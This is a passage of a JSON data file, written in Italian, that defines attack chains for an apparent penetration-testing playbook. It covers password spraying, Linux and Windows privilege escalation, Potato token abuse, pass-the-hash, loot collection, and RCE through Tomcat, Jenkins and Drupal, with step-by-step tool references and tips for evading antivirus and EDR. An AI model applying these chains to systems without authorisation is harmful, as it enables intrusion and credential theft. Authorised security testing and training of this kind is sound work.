+  {
+    "id": "spray-to-foothold",
+    "name": "Password Spray → Foothold",
+    "short": "spray",
+    "category": "exploitation",
+    "subcategory": "cred-attacks",
+    "tactic": "Credential Access",
+    "difficulty": "medium",
+    "estTime": "30-60 min",
+    "objective": "Ottenere il primo accesso valido a un dominio partendo da una lista di nomi. Lo spray prova una sola password contro molti utenti, comportamento che resta sotto la soglia di lockout, al contrario del brute force che concentra molti tentativi su un solo account e lo blocca.",
+    "outcome": "Credenziali di dominio valide e shell sul primo host raggiungibile",
+    "prereqs": [
+      "Una lista di nomi reali, ricavata da OSINT o dall'enumerazione",
+      "Raggiungibilità di SMB, LDAP o Kerberos verso un domain controller",
+      "Password policy nota, per non superare la soglia di lockout"
+    ],
+    "mitre": [
+      "T1110.003",
+      "T1078.002"
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Costruzione della userlist",
+        "cmdRef": "username-anarchy"
+      },
+      {
+        "id": "s2",
+        "title": "Verifica della lockout policy",
+        "cmdRef": "nxc-smb-passpol"
+      },
+      {
+        "id": "s3",
+        "title": "Validazione degli utenti via Kerberos",
+        "cmdRef": "kerbrute-spray",
+        "verify": "Kerbrute distingue gli utenti esistenti da quelli inventati senza generare eventi di logon falliti su SMB."
+      },
+      {
+        "id": "s4",
+        "title": "Password spray su SMB",
+        "cmdRef": "nxc-smb-spray",
+        "variant": "default",
+        "verify": "Una riga con `[+]` indica credenziali valide, e l'eventuale `(Pwn3d!)` che l'utente è amministratore locale su quell'host."
+      },
+      {
+        "id": "s5",
+        "title": "Shell sul target raggiungibile",
+        "cmdRef": "psexec",
+        "variant": "default",
+        "verify": "Si apre il prompt `C:\\Windows\\system32>` e `whoami` restituisce `nt authority\\system`."
+      },
+      {
+        "id": "s6",
+        "title": "Alternativa via WinRM",
+        "cmdRef": "evil-winrm",
+        "variant": "default",
+        "verify": "Il prompt `Evil-WinRM* PS >` conferma la sessione. Richiede l'appartenenza al gruppo Remote Management Users."
+      }
+    ]
+  },
+  {
+    "id": "linux-privesc",
+    "name": "Linux: Enumerazione → root",
+    "short": "linpe",
+    "category": "privesc",
+    "subcategory": "auto-enum",
+    "tactic": "Privilege Escalation",
+    "difficulty": "medium",
+    "estTime": "30-60 min",
+    "objective": "Passare da utente non privilegiato a root su Linux seguendo l'ordine che paga di più: prima l'enumerazione automatica per avere il quadro, poi i quattro vettori classici nell'ordine sudo, SUID, capabilities e cron, e solo alla fine il kernel, che è l'ultima risorsa perché rischia di far cadere la macchina.",
+    "outcome": "Shell di root sul target Linux",
+    "prereqs": [
+      "Shell come utente non privilegiato, preferibilmente già stabilizzata",
+      "Possibilità di scrivere in una directory come /tmp o /dev/shm",
+      "Autorizzazione a tentare exploit kernel, che possono causare crash"
+    ],
+    "mitre": [
+      "T1082",
+      "T1068"
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Enumerazione automatica",
+        "cmdRef": "linpeas",
+        "variant": "local",
+        "verify": "Le voci evidenziate in rosso e giallo sono quelle da esaminare per prime. L'output va salvato, perché è lungo e serve rileggerlo."
+      },
+      {
+        "id": "s2",
+        "title": "Regole sudo",
+        "cmdRef": "sudo-l"
+      },
+      {
+        "id": "s3",
+        "title": "Escape da un binario sudo",
+        "cmdRef": "gtfobins",
+        "verify": "L'escape restituisce una shell con `id` che riporta `uid=0(root)`."
+      },
+      {
+        "id": "s4",
+        "title": "Binari SUID e SGID",
+        "cmdRef": "find-suid",
+        "variant": "default",
+        "verify": "I binari non standard sono quelli interessanti: `pkexec`, `screen` e i binari custom del cliente meritano attenzione, mentre `ping` e `su` sono normali."
+      },
+      {
+        "id": "s5",
+        "title": "Hijack di libreria su binario SUID",
+        "cmdRef": "find-suid",
+        "variant": "soinject",
+        "verify": "`strace` o `ltrace` mostrano la `.so` cercata e non trovata, che è il punto in cui inserire il payload."
+      },
+      {
+        "id": "s6",
+        "title": "Capabilities sui binari",
+        "cmdRef": "getcap-all",
+        "verify": "`cap_setuid` su un interprete come python3 è escalation diretta, `cap_dac_read_search` consente la lettura di `/etc/shadow`."
+      },
+      {
+        "id": "s7",
+        "title": "Cron job e timer",
+        "cmdRef": "cron-discover",
+        "variant": "writable",
+        "verify": "Uno script eseguito da root e scrivibile dall'utente corrente è escalation garantita al successivo avvio del job."
+      },
+      {
+        "id": "s8",
+        "title": "Exploit kernel come ultima risorsa",
+        "cmdRef": "linux-exploit-suggester"
+      }
+    ]
+  },
+  {
+    "id": "windows-privesc",
+    "name": "Windows: Enumerazione → SYSTEM",
+    "short": "winpe",
+    "category": "privesc",
+    "subcategory": "auto-enum",
+    "tactic": "Privilege Escalation",
+    "difficulty": "medium",
+    "estTime": "30-60 min",
+    "objective": "Passare da utente non privilegiato a SYSTEM su Windows. L'ordine che rende di più parte dai privilegi del token, che spesso risolvono in un colpo solo sui service account, per poi passare alle misconfiguration dei servizi e infine alle patch mancanti.",
+    "outcome": "Contesto NT AUTHORITY\\SYSTEM sul target Windows",
+    "prereqs": [
+      "Shell come utente non privilegiato su Windows",
+      "Possibilità di scrivere in una directory come C:\\Windows\\Temp",
+      "Consapevolezza che gli strumenti di enumerazione automatica sono firmati dagli EDR"
+    ],
+    "mitre": [
+      "T1082",
+      "T1068"
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Enumerazione automatica",
+        "cmdRef": "winpeas"
+      },
+      {
+        "id": "s2",
+        "title": "Vista mirata per categoria",
+        "cmdRef": "seatbelt"
+      },
+      {
+        "id": "s3",
+        "title": "Privilegi del token",
+        "cmdRef": "whoami-priv",
+        "verify": "`SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` abilitati portano direttamente alla catena Potato. Anche `SeBackupPrivilege`, `SeDebugPrivilege` e `SeTakeOwnershipPrivilege` sono escalation dirette."
+      },
+      {
+        "id": "s4",
+        "title": "Misconfiguration dei servizi",
+        "cmdRef": "powerup",
+        "variant": "default",
+        "verify": "Le voci `AbuseFunction` indicano già il comando da usare per sfruttare ogni misconfiguration trovata."
+      },
+      {
+        "id": "s5",
+        "title": "AlwaysInstallElevated",
+        "cmdRef": "aie",
+        "variant": "default",
+        "verify": "Entrambe le chiavi, quella in HKLM e quella in HKCU, devono valere `0x1`. Con una sola delle due il vettore non funziona."
+      },
+      {
+        "id": "s6",
+        "title": "Unquoted service path",
+        "cmdRef": "unquoted-path",
+        "variant": "default",
+        "verify": "Serve un path con spazi, non racchiuso fra virgolette, e permessi di scrittura su una delle directory intermedie."
+      },
+      {
+        "id": "s7",
+        "title": "Patch mancanti",
+        "cmdRef": "wes"
+      }
+    ]
+  },
+  {
+    "id": "seimpersonate-system",
+    "name": "SeImpersonate → SYSTEM",
+    "short": "potato",
+    "category": "privesc",
+    "subcategory": "token-priv",
+    "tactic": "Privilege Escalation",
+    "difficulty": "medium",
+    "estTime": "15 min",
+    "objective": "Sfruttare il privilegio SeImpersonatePrivilege, che è assegnato di default ai service account di IIS, MSSQL ed Exchange, per passare a SYSTEM. Il meccanismo consiste nel costringere un processo privilegiato ad autenticarsi verso un named pipe controllato dall'attaccante, che ne impersona poi il token.",
+    "outcome": "Contesto SYSTEM e hash degli account locali",
+    "prereqs": [
+      "Shell come service account con SeImpersonatePrivilege abilitato",
+      "Il tool va scelto in base alla versione di Windows del target",
+      "Possibilità di scrivere ed eseguire un binario sul target"
+    ],
+    "mitre": [
+      "T1134.001",
+      "T1068"
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Conferma del privilegio",
+        "cmdRef": "whoami-priv",
+        "verify": "`SeImpersonatePrivilege` compare nella lista con stato `Enabled`. Se risulta `Disabled` il vettore non è percorribile."
+      },
+      {
+        "id": "s2",
+        "title": "PrintSpoofer su Windows 10 e Server 2016-2019",
+        "cmdRef": "printspoofer",
+        "variant": "default",
+        "verify": "`whoami` restituisce `nt authority\\system` nella nuova shell."
+      },
+      {
+        "id": "s3",
+        "title": "GodPotato per la copertura più ampia",
+        "cmdRef": "printspoofer",
+        "variant": "godpotato",
+        "verify": "Funziona da Server 2012 fino a Server 2022, quindi è la scelta quando la versione non è certa."
+      },
+      {
+        "id": "s4",
+        "title": "JuicyPotatoNG come ripiego",
+        "cmdRef": "printspoofer",
+        "variant": "juicyng",
+        "verify": "Da tentare quando gli altri falliscono, tipicamente per versioni o configurazioni COM particolari."
+      },
+      {
+        "id": "s5",
+        "title": "Dump delle credenziali locali",
+        "cmdRef": "secretsdump",
+        "variant": "local",
+        "verify": "Compaiono gli hash di SAM a partire da `Administrator:500:`, più eventuali segreti LSA e password di servizio in chiaro."
+      },
+      {
+        "id": "s6",
+        "title": "Riuso dell'hash sugli altri host",
+        "cmdRef": "nxc-pth",
+        "variant": "default",
+        "verify": "Un `(Pwn3d!)` su altri host indica che l'account amministratore locale è condiviso, situazione comune e ottima per il movimento laterale."
+      }
+    ]
+  },
+  {
+    "id": "foothold-triage",
+    "name": "Foothold → Triage dell'host",
+    "short": "triage",
+    "category": "post-exp",
+    "subcategory": "situational-awareness",
+    "tactic": "Discovery",
+    "difficulty": "easy",
+    "estTime": "20 min",
+    "objective": "Capire dove si è finiti prima di muovere qualsiasi altro passo: quale utente, con quali privilegi, su quale sistema, dentro quale rete e con quali difese attive. La catena copre sia Linux sia Windows, quindi vanno eseguiti solo i passi del sistema operativo effettivamente incontrato.",
+    "outcome": "Quadro completo di utente, host, rete e credenziali disponibili in locale",
+    "prereqs": [
+      "Una shell qualsiasi sul target, anche non privilegiata",
+      "Nessun requisito di privilegi elevati per la maggior parte dei comandi"
+    ],
+    "mitre": [
+      "T1082",
+      "T1087",
+      "T1552"
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Identità e sistema, Linux",
+        "cmdRef": "sa-linux-who",
+        "verify": "Restituisce utente, gruppi, hostname e distribuzione, cioè il punto di partenza per scegliere il vettore di escalation."
+      },
+      {
+        "id": "s2",
+        "title": "Rete e vicini, Linux",
+        "cmdRef": "sa-linux-net",
+        "verify": "Le connessioni verso subnet non raggiungibili dall'attaccante indicano le reti candidate al pivoting."
+      },
+      {
+        "id": "s3",
+        "title": "Identità e privilegi, Windows",
+        "cmdRef": "sa-win-who",
+        "verify": "I privilegi del token e i gruppi locali dicono subito se esiste una scorciatoia verso SYSTEM."
+      },
+      {
+        "id": "s4",
+        "title": "Sistema e patch, Windows",
+        "cmdRef": "sa-win-sys",
+        "verify": "Versione, build e hotfix installati permettono di valutare gli exploit kernel applicabili."
+      },
+      {
+        "id": "s5",
+        "title": "Utenti e gruppi di dominio",
+        "cmdRef": "sa-win-domain"
+      },
+      {
+        "id": "s6",
+        "title": "Credenziali in chiaro sull'host",
+        "cmdRef": "creds-linux",
+        "variant": "configs",
+        "verify": "File di configurazione, cronologia della shell e variabili d'ambiente sono i tre posti in cui le credenziali compaiono più spesso."
+      },
+      {
+        "id": "s7",
+        "title": "File di valore sul filesystem",
+        "cmdRef": "pillage-files",
+        "variant": "default",
+        "verify": "Database KeePass, backup, repository git e file di risposta automatica sono i candidati più frequenti."
+      }
+    ]
+  },
+  {
+    "id": "loot-exfil",
+    "name": "Trasferimento file e raccolta del loot",
+    "short": "loot",
+    "category": "post-exp",
+    "subcategory": "file-transfer",
+    "tactic": "Collection",
+    "difficulty": "easy",
+    "estTime": "20 min",
+    "objective": "Portare strumenti sul target e riportare indietro il materiale raccolto, scegliendo il canale in base a cosa il target consente. Il metodo giusto dipende da quali binari sono presenti e da quali protocolli il firewall lascia passare in uscita.",
+    "outcome": "Strumenti sul target e loot recuperato sulla macchina attaccante",
+    "prereqs": [
+      "Esecuzione di comandi sul target",
+      "Almeno un canale in uscita fra HTTP, SMB e SSH",
+      "Spazio scrivibile sul target, tipicamente /tmp oppure C:\\Windows\\Temp"
+    ],
+    "mitre": [
+      "T1105",
+      "T1083"
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Server HTTP lato attaccante",
+        "cmdRef": "transfer-http",
+        "variant": "default",
+        "verify": "Il server registra ogni richiesta con IP di origine e codice di risposta, il che conferma anche la raggiungibilità del target."
+      },
+      {
+        "id": "s2",
+        "title": "Download su target Linux",
+        "cmdRef": "transfer-http",
+        "variant": "linux",
+        "verify": "Il file arriva integro, verificabile confrontando l'hash con `md5sum` sui due lati."
+      },
+      {
+        "id": "s3",
+        "title": "Download su target Windows",
+        "cmdRef": "transfer-http",
+        "variant": "windows",
+        "verify": "`Invoke-WebRequest` funziona ovunque, mentre `certutil` è un LOLBin già presente e spesso meno sospetto."
+      },
+      {
+        "id": "s4",
+        "title": "Esecuzione in memoria senza toccare il disco",
+        "cmdRef": "transfer-http",
+        "variant": "memory",
+        "verify": "Lo script viene eseguito senza che nessun file compaia sul filesystem, il che aggira i controlli antivirus su scrittura."
+      },
+      {
+        "id": "s5",
+        "title": "Share SMB come canale alternativo",
+        "cmdRef": "transfer-smb",
+        "variant": "default",
+        "verify": "La share risulta montabile dal target. È la via da preferire quando HTTP in uscita è bloccato ma SMB interno è consentito."
+      },
+      {
+        "id": "s6",
+        "title": "Ricerca del loot sull'host",
+        "cmdRef": "pillage-files",
+        "variant": "default",
+        "verify": "L'elenco dei file trovati va filtrato prima di scaricare, per non esfiltrare dati fuori scope."
+      },
+      {
+        "id": "s7",
+        "title": "Ricerca nelle share di dominio",
+        "cmdRef": "manspider",
+        "variant": "default",
+        "verify": "Ogni risultato riporta share, percorso e contesto del match, così da valutare la rilevanza prima del download."
+      }
+    ]
+  },
+  {
+    "id": "pth-lateral",
+    "name": "Pass-the-Hash → Movimento laterale",
+    "short": "pth",
+    "category": "lateral",
+    "subcategory": "pass-the-hash",
+    "tactic": "Lateral Movement",
+    "difficulty": "medium",
+    "estTime": "20 min",
+    "objective": "Muoversi fra host usando l'hash NT senza mai conoscere la password. NTLM accetta l'hash come prova di identità, quindi l'hash estratto da un host vale su tutti quelli che condividono lo stesso account amministratore locale, situazione ancora molto diffusa.",
+    "outcome": "Shell su host aggiuntivi senza conoscere alcuna password",
+    "prereqs": [
+      "Un hash NT valido, tipicamente estratto da SAM o LSASS",
+      "SMB o WinRM raggiungibili verso i target",
+      "NTLM non disabilitato sul dominio, altrimenti serve Pass-the-Ticket"
+    ],
+    "mitre": [
+      "T1550.002",
+      "T1021.002"
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Estrazione degli hash locali",
+        "cmdRef": "secretsdump",
+        "variant": "local",
+        "verify": "Compare la riga `Administrator:500:` con l'hash NT. La parte LM è di norma vuota sui sistemi moderni e non serve."
+      },
+      {
+        "id": "s2",
+        "title": "Verifica dell'hash su tutta la subnet",
+        "cmdRef": "nxc-pth",
+        "variant": "default",
+        "verify": "Un `(Pwn3d!)` indica che l'hash concede privilegi amministrativi su quell'host."
+      },
+      {
+        "id": "s3",
+        "title": "Account locale invece che di dominio",
+        "cmdRef": "nxc-pth",
+        "variant": "local",
+        "verify": "`--local-auth` è necessario per gli account locali: senza, l'autenticazione viene tentata contro il dominio e fallisce."
+      },
+      {
+        "id": "s4",
+        "title": "Shell con PsExec",
+        "cmdRef": "psexec",
+        "variant": "hash",
+        "verify": "Si ottiene SYSTEM ma il metodo crea un servizio sul target, quindi è il più rumoroso e il più registrato dagli EDR."
+      },
+      {
+        "id": "s5",
+        "title": "Alternativa più discreta con WMI",
+        "cmdRef": "wmiexec",
+        "variant": "hash",
+        "verify": "Non crea servizi né scrive file, al prezzo di una shell semi-interattiva che esegue un comando per volta."
+      },
+      {
+        "id": "s6",
+        "title": "WinRM quando disponibile",
+        "cmdRef": "nxc-pth",
+        "variant": "winrm",
+        "verify": "Richiede l'appartenenza a Remote Management Users ed è generalmente meno sorvegliato di SMB."
+      }
+    ]
+  },
+  {
+    "id": "tomcat-rce",
+    "name": "Tomcat Manager → WAR → RCE",
+    "short": "tomcat",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "tactic": "Exploitation",
+    "difficulty": "medium",
+    "estTime": "20 min",
+    "objective": "Da un Tomcat esposto a esecuzione di comandi sul server. La leva è il Manager: con credenziali deboli o di default si carica un WAR contenente una JSP shell, che Tomcat esegue con i privilegi del proprio processo. È un foothold classico verso la rete interna, perché Tomcat gira spesso su host applicativi.",
+    "outcome": "Shell come utente del servizio Tomcat",
+    "prereqs": [
+      "Un'istanza Tomcat raggiungibile, tipicamente su 8080 o 8180",
+      "Accesso al Manager, che richiede credenziali valide",
+      "Connettività in uscita dal target verso la macchina attaccante"
+    ],
+    "mitre": [
+      "T1190",
+      "T1505.003"
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Fingerprint di versione",
+        "cmdRef": "whatweb",
+        "verify": "L'header HTTP Server o la pagina /docs rivelano la versione, per esempio `Apache Tomcat 9.0.30`. Una versione con CVE nota può rendere superfluo il resto."
+      },
+      {
+        "id": "s2",
+        "title": "Trova il Manager",
+        "cmdRef": "ffuf-dir",
+        "variant": "default",
+        "verify": "Compaiono `/manager` e `/host-manager`, tipicamente con codice 302 verso la pagina di login."
+      },
+      {
+        "id": "s3",
+        "title": "Prova le credenziali di default",
+        "cmdRef": "web-default-creds",
+        "verify": "Un codice 200 sul Manager con `tomcat:tomcat` o `admin:admin` conferma l'accesso senza bruteforce."
+      },
+      {
+        "id": "s4",
+        "title": "Bruteforce del Manager se i default falliscono",
+        "cmdRef": "tomcat-manager",
+        "variant": "msf",
+        "verify": "`Login Successful: tomcat:admin` oppure un'altra coppia valida. `STOP_ON_SUCCESS` ferma al primo esito utile."
+      },
+      {
+        "id": "s5",
+        "title": "Genera il payload WAR",
+        "cmdRef": "msfvenom",
+        "variant": "war",
+        "verify": "Il file `shell.war` viene creato; `java/jsp_shell_reverse_tcp` è il payload corretto per il container Java."
+      },
+      {
+        "id": "s6",
+        "title": "Listener in ascolto",
+        "cmdRef": "nc-listen",
+        "variant": "default",
+        "verify": "Il listener resta in attesa sulla porta scelta come LPORT."
+      },
+      {
+        "id": "s7",
+        "title": "Deploy del WAR ed esecuzione",
+        "cmdRef": "tomcat-manager",
+        "variant": "deploy",
+        "verify": "Il deploy risponde `OK - Deployed application`, e la richiesta a `/shell/` fa arrivare la connessione sul listener."
+      },
+      {
+        "id": "s8",
+        "title": "Stabilizzazione della shell",
+        "cmdRef": "shell-pty",
+        "variant": "full",
+        "verify": "La sessione regge Ctrl+C e gli editor interattivi. `id` mostra l'utente del servizio Tomcat."
+      }
+    ]
+  },
+  {
+    "id": "jenkins-rce",
+    "name": "Jenkins Script Console → RCE",
+    "short": "jenkins",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "tactic": "Exploitation",
+    "difficulty": "easy",
+    "estTime": "15 min",
+    "objective": "Da un'istanza Jenkins esposta all'esecuzione di comandi sul server. La leva è la Script Console, che interpreta Groovy con i privilegi del processo: credenziali di default, accesso anonimo o un account admin bastano per raggiungerla. Un comando Groovy conferma la RCE, poi una reverse shell consolida il foothold, spesso già come SYSTEM o root.",
+    "outcome": "Esecuzione comandi come utente del processo Jenkins, spesso SYSTEM o root",
+    "prereqs": [
+      "Un'istanza Jenkins raggiungibile, tipicamente su 8080",
+      "Accesso alla dashboard tramite credenziali di default, account admin o istanza senza autenticazione",
+      "Connettività in uscita dal target verso la macchina attaccante"
+    ],
+    "mitre": [
+      "T1190",
+      "T1059"
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Fingerprint di Jenkins",
+        "cmdRef": "whatweb",
+        "verify": "L'header `X-Jenkins` o la pagina `/configureSecurity/` rivelano Jenkins e la versione."
+      },
+      {
+        "id": "s2",
+        "title": "Accesso alla dashboard",
+        "cmdRef": "web-default-creds",
+        "verify": "La dashboard risponde 200 con `admin:admin` o senza login. L'assenza di redirect a `/login` indica accesso anonimo."
+      },
+      {
+        "id": "s3",
+        "title": "Conferma della RCE via Groovy",
+        "cmdRef": "jenkins-script",
+        "variant": "default",
+        "verify": "L'output di `id` o `whoami` compare nella console, per esempio `nt authority\\system` o `uid=...(jenkins)`."
+      },
+      {
+        "id": "s4",
+        "title": "Listener in ascolto",
+        "cmdRef": "nc-listen",
+        "variant": "default",
+        "verify": "Il listener resta in ascolto sulla porta scelta come LPORT."
+      },
+      {
+        "id": "s5",
+        "title": "Reverse shell da Groovy",
+        "cmdRef": "jenkins-script",
+        "variant": "linux",
+        "verify": "La connessione arriva sul listener. Su host Windows va usata la variante ProcessBuilder al posto di quella `/dev/tcp`."
+      },
+      {
+        "id": "s6",
+        "title": "Stabilizzazione della shell",
+        "cmdRef": "shell-pty",
+        "variant": "full",
+        "verify": "La sessione regge Ctrl+C e gli editor. `whoami` conferma l'utente del processo Jenkins."
+      }
+    ]
+  },
+  {
+    "id": "drupal-rce",
+    "name": "Drupal → PHP filter / Drupalgeddon → RCE",
+    "short": "drupal",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "tactic": "Exploitation",
+    "difficulty": "medium",
+    "estTime": "25 min",
+    "objective": "Da un CMS Drupal a esecuzione di comandi. Prima si conferma la piattaforma e se ne ricava la versione, che decide la strada: sui core datati Drupalgeddon2 dà RCE senza credenziali, altrimenti con accesso amministrativo il modulo PHP filter pubblica una pagina che esegue PHP. Il web shell viene poi convertito in reverse shell stabile come www-data.",
+    "outcome": "Shell come utente del web server, tipicamente www-data",
+    "prereqs": [
+      "Un'istanza Drupal raggiungibile via HTTP",
+      "Per la via autenticata, accesso amministrativo al pannello",
+      "Connettività in uscita dal target verso la macchina attaccante"
+    ],
+    "mitre": [
+      "T1190",
+      "T1505.003"
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Footprint di Drupal",
+        "cmdRef": "whatweb",
+        "verify": "Il meta `Generator` con `Drupal 8`, la stringa `Powered by Drupal` o le URI del tipo `/node/1` confermano la piattaforma."
+      },
+      {
+        "id": "s2",
+        "title": "Versione e moduli",
+        "cmdRef": "droopescan",
+        "variant": "default",
+        "verify": "`Possible version(s): 8.9.1` e i moduli installati, per esempio `.../modules/php/`. Una versione vecchia orienta su Drupalgeddon."
+      },
+      {
+        "id": "s3",
+        "title": "Scorciatoia pre-auth se la versione è vulnerabile",
+        "cmdRef": "drupal-rce",
+        "variant": "drupalgeddon2",
+        "verify": "Su core < 7.58 o < 8.5.1 arriva una sessione Meterpreter. `id` mostra `uid=33(www-data)`."
+      },
+      {
+        "id": "s4",
+        "title": "Accesso admin per la via autenticata",
+        "cmdRef": "web-default-creds",
+        "verify": "Il pannello `/user/login` accetta le credenziali e `/admin` è raggiungibile."
+      },
+      {
+        "id": "s5",
+        "title": "Web shell via PHP filter",
+        "cmdRef": "drupal-rce",
+        "variant": "default",
+        "verify": "`curl .../node/<node>?<hash>=id` restituisce `uid=33(www-data)`. La Basic page va salvata con Text format `PHP code`."
+      },
+      {
+        "id": "s6",
+        "title": "Listener in ascolto",
+        "cmdRef": "nc-listen",
+        "variant": "default",
+        "verify": "Il listener resta in ascolto sulla porta scelta come LPORT."
+      },
+      {
+        "id": "s7",
+        "title": "Reverse shell dal web shell",
+        "cmdRef": "revshell",
+        "variant": "default",
+        "verify": "Il one-liner bash, url-encoded nel parametro della web shell, fa arrivare la connessione sul listener."
+      },
+      {
+        "id": "s8",
+        "title": "Stabilizzazione della shell",
+        "cmdRef": "shell-pty",
+        "variant": "full",
+        "verify": "La sessione regge Ctrl+C e gli editor. `id` conferma www-data."
       }
     ]
   }
